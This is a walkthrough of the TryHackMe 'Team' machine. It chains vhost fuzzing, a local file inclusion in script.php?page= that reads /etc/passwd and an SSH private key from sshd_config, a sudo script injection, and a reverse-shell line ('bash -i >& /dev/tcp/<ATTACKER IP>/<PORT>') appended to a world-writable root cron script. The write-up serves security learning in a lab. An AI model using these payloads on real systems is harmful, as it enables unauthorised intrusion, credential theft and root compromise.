# 👥 TryHackMe — Team

> **Difficulty:** Easy | **OS:** Linux | **Category:** Web / LFI / Privilege Escalation
> **Author:** Aryan Barkhordar

---

## Table of Contents

- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
  * [Port Scanning](#port-scanning)
  * [FTP Enumeration](#ftp-enumeration)
  * [Web Enumeration — team.thm](#web-enumeration--teamthm)
- [Exploitation](#exploitation)
  * [Virtual Host Discovery — dev.team.thm](#virtual-host-discovery--devteamthm)
  * [Local File Inclusion — `script.php?page=`](#local-file-inclusion--scriptphppage)
  * [Sensitive File Disclosure — SSH Private Key](#sensitive-file-disclosure--ssh-private-key)
  * [SSH Access as `dale`](#ssh-access-as-dale)
- [Privilege Escalation](#privilege-escalation)
  * [Lateral Movement — `admin_checks` Script Injection](#lateral-movement--admin_checks-script-injection)
  * [Root Access — Writable Cron Script](#root-access--writable-cron-script)
- [Flags](#flags)
- [Summary](#summary)

---

## Overview

**Team** is a TryHackMe machine that chains together several enumeration and exploitation techniques. An initial `nmap` scan reveals FTP, SSH, and HTTP. The web server responds with a default Apache page, but a hint embedded in its source directs enumeration toward a virtual host. Gobuster on the correct vhost uncovers a `robots.txt` with a username, while `ffuf` virtual host fuzzing reveals a development subdomain hosting a **Local File Inclusion** vulnerability. This is exploited to read the SSH daemon config, which contains a private key for `dale`. From there, a `sudo` rule enables injection into a script running as `gyles`, and a world-writable cron script running as `root` completes the escalation chain.

---

## Reconnaissance

### Port Scanning

An initial `nmap` service scan revealed three open ports:

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

> **Key Finding:** FTP, SSH, and HTTP were all available. The web service was the most likely attack surface.

---

### FTP Enumeration

Anonymous FTP login was attempted but was not permitted. This avenue was deprioritised in favour of the web service.

---

### Web Enumeration — team.thm

Navigating to `http://<TARGET>` presented the default Apache2 Ubuntu landing page. An initial `gobuster` scan against the IP address returned no meaningful results.

Inspecting the page source of the Apache default page revealed an embedded comment:

```
<!-- If you see this add team.thm to your hosts! -->
```

The hostname `team.thm` was added to `/etc/hosts` and the site was revisited. `gobuster` was rerun against `http://team.thm`, this time uncovering a `robots.txt` file:

```
gobuster dir -u http://team.thm -w /usr/share/wordlists/dirb/common.txt
```

```
/robots.txt   (Status: 200)
```

Fetching `robots.txt` revealed a single entry: the username **`dale`**.

A Hydra brute-force attempt against FTP using `dale` as the username returned no valid credentials.

---

## Exploitation

### Virtual Host Discovery — dev.team.thm

Virtual host enumeration was performed using `ffuf`:

```
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -H "Host: FUZZ.team.thm" -u http://team.thm -fs <DEFAULT_SIZE>
```

A new subdomain was returned:

```
dev.team.thm
```

`dev.team.thm` was added to `/etc/hosts`. Navigating to it revealed a basic development page with a single link labelled "team share".

---

### Local File Inclusion — `script.php?page=`

Clicking the link navigated to:

```
http://dev.team.thm/script.php?page=teamshare.php
```

The `page` parameter was immediately suspicious — it appeared to be loading a local file by name. Testing with a known system file confirmed a **Local File Inclusion** vulnerability:

```
http://dev.team.thm/script.php?page=../../../../etc/passwd
```

The contents of `/etc/passwd` were returned, confirming the `dale` user and providing the LFI primitive needed for further file disclosure.

> **Key Observation:** The `page` parameter passed the value directly to a PHP `include()` or `file_get_contents()` call with no input validation — a classic LFI pattern.

The **user flag** was retrieved via LFI:

```
http://dev.team.thm/script.php?page=../../../../home/dale/user.txt
```

---

### Sensitive File Disclosure — SSH Private Key

With the LFI confirmed, `ffuf` was used to fuzz the `page` parameter for sensitive system files:

```
ffuf -w /path/to/lfi-wordlist.txt \
     -u "http://dev.team.thm/script.php?page=FUZZ"
```

Among the discoverable files was:

```
/etc/ssh/sshd_config
```

The SSH daemon configuration file was read via the LFI. Inspecting it in Burp Suite's response pane revealed an **RSA private key** embedded within the config — belonging to the user `dale`.

> **Key Finding:** A private key embedded directly in the `sshd_config` file is a significant operational security failure — the file is world-readable and the key was not passphrase-protected.

---

### SSH Access as `dale`

The private key was copied from the response, saved to a local file, and its permissions were corrected:

```
chmod 600 dale_id_rsa
```

SSH access was established using the key:

```
ssh -i dale_id_rsa dale@<TARGET>
```

---

## Privilege Escalation

### Lateral Movement — `admin_checks` Script Injection

With a shell as `dale`, sudo permissions were checked:

```
sudo -l
```

The output revealed:

```
(gyles) NOPASSWD: /home/gyles/admin_checks
```

The `admin_checks` script was readable and contained an unsafe construction:

```bash
read -p "Enter error: " error
echo $error 2>/dev/null
```

The `$error` variable was passed to a command without sanitisation. By injecting `/bin/bash` as the input, a shell was spawned as `gyles`:

```
sudo -u gyles /home/gyles/admin_checks
```

When prompted, entering `/bin/bash` broke out of the script and provided a shell running as `gyles`.

---

### Root Access — Writable Cron Script

Reviewing `gyles`'s `.bash_history` revealed references to `/usr/local/bin/main_backup.sh` and mentions of a cron job. LinPEAS confirmed that this script was executed periodically by a root cron job and was **world-writable**.

A reverse shell payload was injected into the script:

```bash
echo 'bash -i >& /dev/tcp/<ATTACKER IP>/<PORT> 0>&1' >> /usr/local/bin/main_backup.sh
```

A Netcat listener was started on the attacker machine. When the cron job next executed the script, a shell connected back as `root`. The **root flag** was retrieved:

```
# cat /root/root.txt
THM{REDACTED}
```

---

## Flags

| Flag        | Value           |
| ----------- | --------------- |
| 🏳️ **User** | `THM{REDACTED}` |
| 🚩 **Root**  | `THM{REDACTED}` |

---

## Summary

| Stage                    | Technique                                                                              |
| ------------------------ | -------------------------------------------------------------------------------------- |
| **Recon**                | `nmap` scan, Apache default page source hint, `gobuster` on `team.thm`                 |
| **OSINT**                | `robots.txt` → username `dale`                                                         |
| **Vhost Discovery**      | `ffuf` virtual host fuzzing → `dev.team.thm`                                           |
| **LFI**                  | `script.php?page=` parameter → `/etc/passwd`, user flag, `sshd_config`                 |
| **Initial Access**       | RSA private key extracted from `sshd_config` → SSH as `dale`                           |
| **Lateral Movement**     | `sudo -u gyles /home/gyles/admin_checks` → `$error` injection → shell as `gyles`      |
| **Privilege Escalation** | World-writable root cron script `/usr/local/bin/main_backup.sh` → reverse shell → root |

---

*Writeup by Aryan Barkhordar*
